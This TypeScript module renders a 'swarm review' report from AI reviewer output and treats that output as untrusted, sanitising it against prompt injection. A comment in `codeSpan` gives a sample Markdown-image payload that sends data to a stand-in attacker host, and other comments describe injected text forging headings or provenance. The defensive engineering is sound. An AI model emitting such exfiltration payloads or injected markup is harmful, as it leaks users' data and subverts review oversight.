/**
 * The `ReviewReport` document a `swarm-review` step persists (`PLAN-M13.md` P17, `SPEC-QUESTIONS.md` Q217):
 * pure functions from the perspectives' structured output to the document text. No I/O, no clock, no
 * randomness, so the same perspectives always render the same report.
 *
 * **Who decides what.** The reviewers stay read-only (`reviewer` is `write: false`); the engine writes this
 * document. Everything a perspective returned is untrusted model output (it may have read hostile files), so
 * nothing in it is ever interpreted:
 * - The verdicts are computed here from the structured findings' severities and from whether the output was
 *   usable at all, never parsed from prose (the reviewer's own instructions say "do not write an approval or
 *   a pass verdict"), and they are printed by the engine under its own heading.
 * - Every string a perspective supplied (a finding summary, a `checked` item, its name) is reduced to one
 *   line of printable text, capped, and rendered only as the tail of a list item, so it can never start a
 *   line of its own: it cannot open a heading, a table, a fence, a front matter block, or a line that looks
 *   like the engine's `- Step:` / `- Run:` provenance lines.
 * - The front matter is built from engine values only and serialised by the YAML writer, so no text of a
 *   perspective can reach it.
 *
 * **Verdicts** (per perspective, then merged with the same precedence):
 * `blocked` (at least one `blocking` finding) over `incomplete` (no structured output, malformed entries were
 * dropped, or no findings and nothing listed as checked: the review may be missing a finding, so it is never
 * read as clean) over `concerns` (at least one `major` finding) over `clear` (only `minor` findings, or none,
 * with evidence of what was examined).
 *
 * @see specs/05 §5.7
 * @see specs/13 §13.3
 * @see specs/18 §18.6, §18.7
 * @see SPEC-QUESTIONS.md Q217
 */
import * as YAML from 'yaml';

import type { PerspectiveReview, ReviewSeverity } from './types.ts';

export type ReviewVerdict = 'blocked' | 'incomplete' | 'concerns' | 'clear';

/** Bounds on what one perspective may put into the document. The verdict is computed before any cap, and
 * findings are listed most severe first, so a cap can only ever drop the least severe ones. */
export const REVIEW_LIMITS = {
  summaryChars: 1500,
  checkedChars: 200,
  perspectiveNameChars: 40,
  findingsPerPerspective: 100,
  checkedPerPerspective: 50,
  titleChars: 200,
} as const;

const SEVERITY_ORDER: readonly ReviewSeverity[] = ['blocking', 'major', 'minor'];
const SEVERITY_RANK: Readonly<Record<ReviewSeverity, number>> = { blocking: 3, major: 2, minor: 1 };

/** Every line break a Markdown or YAML reader might honour (LF, CR, VT, FF, NEL, LS, PS), and the tab. */
const LINE_BREAKS = /[\t\n\r\v\f\u0085\u2028\u2029]/g;
/** C0/C1 controls and every format character (zero-width, bidi overrides, tag characters): invisible or
 * terminal-repainting, never part of an honest finding. */
const INVISIBLE = /[\p{Cc}\p{Cf}]/gu;

/**
 * Reduces untrusted text to one printable line no longer than `cap`, saying so when it cuts. Also defangs
 * an HTML comment opener/closer, which Markdown viewers would hide text inside.
 */
export function sanitizeInline(text: string, cap: number): string {
  const oneLine = text
    .replace(LINE_BREAKS, ' ')
    .replace(INVISIBLE, '')
    .replace(/\s+/g, ' ')
    .replace(/<!--/g, '<\\!--')
    .replace(/-->/g, '--\\>')
    .trim();
  if (oneLine.length <= cap) return oneLine;
  // Cut on a code point boundary: a lone surrogate is invalid in the UTF-8 file.
  const cut = Array.from(oneLine).slice(0, cap).join('');
  return `${cut} ...(truncated, ${String(oneLine.length)} characters)`;
}

/** A perspective name as an identifier: it comes from workflow YAML, but it becomes a heading. */
export function sanitizePerspectiveName(name: string): string {
  const cleaned = name
    .replace(/[^A-Za-z0-9._-]+/g, '_')
    .slice(0, REVIEW_LIMITS.perspectiveNameChars)
    .replace(/^_+|_+$/g, '');
  return cleaned === '' ? 'perspective' : cleaned;
}

/**
 * `text` (already one line) as a Markdown code span. Inside a code span nothing is interpreted: no link, image,
 * emphasis or HTML, so a prompt-injected `![x](https://attacker/?d=...)` or `<img ...>` is shown, not loaded,
 * and the text cannot restyle the engine's own attribution after it. The delimiter is longer than any run of
 * backticks inside, so the text cannot close the span early.
 */
export function codeSpan(text: string): string {
  const longest = Math.max(0, ...(text.match(/`+/g) ?? []).map((run) => run.length));
  const delimiter = '`'.repeat(longest + 1);
  return `${delimiter} ${text} ${delimiter}`;
}

interface RenderedFinding {
  readonly severity: ReviewSeverity;
  readonly summary: string;
  /** The whole sanitised summary, before the display cap: what identical findings are recognised by. */
  readonly key: string;
}

export interface RenderedPerspective {
  readonly name: string;
  readonly verdict: ReviewVerdict;
  readonly findings: readonly RenderedFinding[];
  readonly checked: readonly string[];
  /** Why the verdict is `incomplete`, when it is (engine wording, never model text). */
  readonly incompleteReason?: string;
  readonly omittedFindings: number;
  readonly omittedChecked: number;
}

/** `blocked` > `incomplete` > `concerns` > `clear`. */
const VERDICT_RANK: Readonly<Record<ReviewVerdict, number>> = {
  blocked: 4,
  incomplete: 3,
  concerns: 2,
  clear: 1,
};

function mostSevere(verdicts: readonly ReviewVerdict[]): ReviewVerdict {
  let worst: ReviewVerdict = 'clear';
  for (const verdict of verdicts) {
    if (VERDICT_RANK[verdict] > VERDICT_RANK[worst]) worst = verdict;
  }
  return worst;
}

/** The verdict of one perspective from what it structurally returned. Exported for the unit tests. */
export function perspectiveVerdict(review: PerspectiveReview): {
  readonly verdict: ReviewVerdict;
  readonly incompleteReason?: string;
} {
  if (review.findings.some((finding) => finding.severity === 'blocking')) {
    return { verdict: 'blocked' };
  }
  if (!review.structured) {
    return {
      verdict: 'incomplete',
      incompleteReason: 'the session returned no structured findings, so nothing can be trusted',
    };
  }
  if (review.dropped > 0) {
    return {
      verdict: 'incomplete',
      incompleteReason: `${String(review.dropped)} malformed entr${review.dropped === 1 ? 'y was' : 'ies were'} skipped and one of them may have been a blocking finding`,
    };
  }
  if (review.findings.length === 0 && review.checked.length === 0) {
    return {
      verdict: 'incomplete',
      incompleteReason: 'it reported no findings and nothing it examined',
    };
  }
  if (review.findings.some((finding) => finding.severity === 'major')) {
    return { verdict: 'concerns' };
  }
  return { verdict: 'clear' };
}

/** What a finding whose summary is nothing but invisible characters renders as: it still counts, at its severity. */
const NO_TEXT = '(no text)';

function renderPerspective(review: PerspectiveReview, name: string): RenderedPerspective {
  // Sanitised FIRST, and the verdict computed from what is shown: an evidence list of zero-width characters is
  // no evidence, and must not read as "checked" in the verdict while rendering as "(nothing listed)".
  const checked = review.checked
    .map((item) => sanitizeInline(item, REVIEW_LIMITS.checkedChars))
    .filter((item) => item !== '');
  const { verdict, incompleteReason } = perspectiveVerdict({ ...review, checked });
  const findings = review.findings
    .map((finding, index) => ({
      index,
      severity: finding.severity,
      summary: sanitizeInline(finding.summary, REVIEW_LIMITS.summaryChars) || NO_TEXT,
      key: sanitizeInline(finding.summary, Number.POSITIVE_INFINITY) || NO_TEXT,
    }))
    // Most severe first, the model's own order within a severity (a stable, deterministic tie-break).
    .sort((a, b) => SEVERITY_RANK[b.severity] - SEVERITY_RANK[a.severity] || a.index - b.index)
    .map(({ severity, summary, key }) => ({ severity, summary, key }));
  return {
    name,
    verdict,
    ...(incompleteReason === undefined ? {} : { incompleteReason }),
    findings: findings.slice(0, REVIEW_LIMITS.findingsPerPerspective),
    checked: checked.slice(0, REVIEW_LIMITS.checkedPerPerspective),
    omittedFindings: Math.max(0, findings.length - REVIEW_LIMITS.findingsPerPerspective),
    omittedChecked: Math.max(0, checked.length - REVIEW_LIMITS.checkedPerPerspective),
  };
}

/** A sanitised perspective name, made unique within `used`: two names that sanitise identically (`a b`,
 * `a_b`) must not be merged into one attribution. */
function uniqueName(perspective: string, used: Set<string>): string {
  const base = sanitizePerspectiveName(perspective);
  let candidate = base;
  for (let n = 2; used.has(candidate); n += 1) candidate = `${base}-${String(n)}`;
  used.add(candidate);
  return candidate;
}

interface MergedFinding {
  readonly severity: ReviewSeverity;
  readonly summary: string;
  readonly perspectives: readonly string[];
}

/** The one merge policy `05` §5.7 names and `dispatchSwarmReview` already applies: identical summaries collapse
 * into one finding attributed to every perspective that raised it, at the MORE severe of their ratings. */
function mergeFindings(perspectives: readonly RenderedPerspective[]): readonly MergedFinding[] {
  const merged = new Map<
    string,
    { summary: string; severity: ReviewSeverity; perspectives: string[] }
  >();
  for (const perspective of perspectives) {
    for (const finding of perspective.findings) {
      const existing = merged.get(finding.key);
      if (existing === undefined) {
        merged.set(finding.key, {
          summary: finding.summary,
          severity: finding.severity,
          perspectives: [perspective.name],
        });
        continue;
      }
      if (!existing.perspectives.includes(perspective.name)) {
        existing.perspectives.push(perspective.name);
      }
      if (SEVERITY_RANK[finding.severity] > SEVERITY_RANK[existing.severity]) {
        existing.severity = finding.severity;
      }
    }
  }
  return [...merged.entries()]
    .map(([, value], index) => ({ index, ...value }))
    .sort((a, b) => SEVERITY_RANK[b.severity] - SEVERITY_RANK[a.severity] || a.index - b.index)
    .map(({ summary, severity, perspectives: raisedBy }) => ({
      summary,
      severity,
      perspectives: raisedBy,
    }));
}

export interface ReviewReportContent {
  readonly verdict: ReviewVerdict;
  readonly perspectives: readonly RenderedPerspective[];
  readonly findings: readonly MergedFinding[];
  /** The Markdown body (everything after the front matter). */
  readonly body: string;
}

export interface ReviewReportInput {
  readonly stepId: string;
  readonly runId: string;
  /** The reviewing agent's id: what the document's `author` records. */
  readonly agentId: string;
  readonly reviews: readonly PerspectiveReview[];
  /** The revision the perspectives read: the head of the lane under review when the step is stacked on it
   * (they run in that lane's worktree), else the project checkout's `HEAD`. */
  readonly reviewedRevision: string;
  /** The commit the step's own lane branched from. */
  readonly laneBase: string;
}

/** One-line code-span rendering of an engine-known identifier (a step id can carry run-input text). */
function code(value: string): string {
  return codeSpan(sanitizeInline(value, 300));
}

/** The provenance the resume path looks for: exactly these two engine-written lines, at column 0. */
export function provenanceLines(stepId: string, runId: string): readonly string[] {
  return [`- Step: ${code(stepId)}`, `- Run: ${code(runId)}`];
}

function countBySeverity(findings: readonly MergedFinding[], severity: ReviewSeverity): number {
  return findings.filter((finding) => finding.severity === severity).length;
}

function renderPerspectiveSection(perspective: RenderedPerspective): string[] {
  const lines = [`### ${perspective.name}`, '', `- Verdict: ${perspective.verdict}`];
  if (perspective.incompleteReason !== undefined) {
    lines.push(`- Why incomplete: ${perspective.incompleteReason}`);
  }
  lines.push('- Checked:');
  if (perspective.checked.length === 0) lines.push('  - (nothing listed)');
  for (const item of perspective.checked) lines.push(`  - ${codeSpan(item)}`);
  if (perspective.omittedChecked > 0) {
    lines.push(`  - (${String(perspective.omittedChecked)} more omitted)`);
  }
  lines.push('- Findings:');
  if (perspective.findings.length === 0) lines.push('  - (none)');
  perspective.findings.forEach((finding, index) => {
    lines.push(`  ${String(index + 1)}. [${finding.severity}] ${codeSpan(finding.summary)}`);
  });
  if (perspective.omittedFindings > 0) {
    lines.push(`  - (${String(perspective.omittedFindings)} more, least severe, omitted)`);
  }
  lines.push('');
  return lines;
}

/** Builds the verdicts and the Markdown body. Deterministic. */
export function buildReviewReport(input: ReviewReportInput): ReviewReportContent {
  if (input.reviews.length === 0) {
    // No perspective is not a clean review: with nothing to take the most severe of, the verdict would read
    // `clear`. The caller (`writeReport`) turns this into a typed step failure.
    throw new RangeError('a ReviewReport needs at least one perspective');
  }
  const used = new Set<string>();
  const perspectives = input.reviews.map((review) =>
    renderPerspective(review, uniqueName(review.perspective, used)),
  );
  const findings = mergeFindings(perspectives);
  const verdict = mostSevere(perspectives.map((perspective) => perspective.verdict));
  const counts = SEVERITY_ORDER.map(
    (severity) => `${String(countBySeverity(findings, severity))} ${severity}`,
  ).join(', ');

  const lines: string[] = [
    '## Summary',
    '',
    `- Verdict: **${verdict}**`,
    ...provenanceLines(input.stepId, input.runId),
    `- Reviewer: ${code(input.agentId)}`,
    `- Reviewed revision: ${code(input.reviewedRevision)} (the tree the perspectives read: the reviewed lane's head when this step is stacked on it, else the project checkout)`,
    `- Lane base: ${code(input.laneBase)}`,
    `- Perspectives: ${perspectives.map((p) => `${p.name} (${p.verdict})`).join(', ')}`,
    `- Findings after merging identical summaries: ${counts}`,
    '',
    "The engine computed the verdicts from the perspectives' structured findings; no text a reviewer wrote decides them. A perspective is `blocked` when it reported a blocking finding, `incomplete` when its output was missing, malformed or listed neither findings nor anything examined, `concerns` when it reported a major finding, and `clear` otherwise. The merged verdict is the most severe of the perspectives'.",
    '',
    '## Perspectives',
    '',
    ...perspectives.flatMap(renderPerspectiveSection),
    '## Findings',
    '',
  ];
  if (findings.length === 0) lines.push('- (none)');
  for (const finding of findings) {
    lines.push(
      `- [${finding.severity}] ${codeSpan(finding.summary)} (${finding.perspectives.join(', ')})`,
    );
  }
  lines.push('');
  return { verdict, perspectives, findings, body: lines.join('\n') };
}

export interface ReviewFrontMatterInput {
  readonly id: string;
  readonly stepId: string;
  readonly runId: string;
  readonly agentId: string;
  /** The engine clock, epoch milliseconds. */
  readonly nowMs: number;
  readonly verdict: ReviewVerdict;
}

/** The front matter object (`18` §18.6 base fields, `reviewReportSchema`): engine values only. */
export function reviewFrontMatter(input: ReviewFrontMatterInput): Record<string, unknown> {
  const date = new Date(input.nowMs).toISOString().slice(0, 10);
  const author = sanitizeInline(input.agentId, 100) || 'engine';
  return {
    id: input.id,
    type: 'ReviewReport',
    schemaVersion: 1,
    title: `Swarm review: ${sanitizeInline(input.stepId, REVIEW_LIMITS.titleChars)}`,
    status: 'final',
    created: date,
    updated: date,
    revision: 1,
    author,
    run: sanitizeInline(input.runId, 200),
    changelog: [
      {
        revision: 1,
        date,
        by: author,
        summary: `Recorded by the engine from the perspective sessions' structured findings (merged verdict: ${input.verdict}).`,
      },
    ],
  };
}

/** The whole file: `---`, the YAML front matter, `---`, a blank line, the body. */
export function renderReviewReportFile(frontMatter: Record<string, unknown>, body: string): string {
  return `---\n${YAML.stringify(frontMatter)}---\n\n${body}`;
}
